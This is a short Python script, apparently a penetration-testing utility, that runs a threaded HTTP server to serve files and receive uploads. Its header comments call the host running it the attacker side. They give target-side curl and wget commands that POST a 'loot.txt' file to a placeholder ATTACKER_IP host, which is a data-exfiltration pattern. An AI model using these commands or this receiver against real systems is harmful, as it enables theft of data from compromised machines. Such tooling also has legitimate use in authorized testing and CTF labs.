#!/usr/bin/env python3
# ==============================================================
# Downy.py — Threaded HTTP file receiver
# ==============================================================
#
# CONFIGURE BEFORE RUNNING:
#   PORT       — listening port (must match your payload's target port)
#   BIND_ADDR  — interface to bind; "0.0.0.0" = all, or your tun0 IP
#
# USAGE (attacker side):
#   python3 Downy.py
#   # Serves CWD on GET, receives files on POST
#
# USAGE (target side):
#   curl http://ATTACKER_IP:PORT/ -F "file=@loot.txt"     # or:
#   wget --post-file=loot.txt http://ATTACKER_IP:PORT/loot.txt
#
# Files are saved in the CWD of the attacker, named after the
# URL path (basename-sanitized). Requests to "/" with no POST
# body get a 400.
# ==============================================================
import http.server
import socketserver
import os
import urllib.parse

PORT = 6789          # CONFIGURE: change to your chosen port
BIND_ADDR = "0.0.0.0"  # CONFIGURE: "0.0.0.0" = all interfaces

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"No Content-Length\n")
            return

        raw_name = urllib.parse.unquote(self.path.lstrip('/')) or "downfile"
        safe_name = os.path.basename(raw_name) or "downfile"

        remaining = content_length
        with open(safe_name, "wb") as f:
            while remaining > 0:
                chunk = self.rfile.read(min(8192, remaining))
                if not chunk:
                    break
                f.write(chunk)
                remaining -= len(chunk)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Success!\n")
        print(f"[+] {self.address_string()} → {content_length} bytes saved as {safe_name}")

    def log_message(self, format, *args):
        print(f"[HTTP] {self.address_string()} - {format % args}")

class ThreadedHTTP(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

if __name__ == "__main__":
    with ThreadedHTTP((BIND_ADDR, PORT), CustomHandler) as httpd:
        print(f"[i] Listening on {BIND_ADDR}:{PORT}")
        print(f"[i] Serves CWD on GET, receives files on POST")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[i] Shutting down")
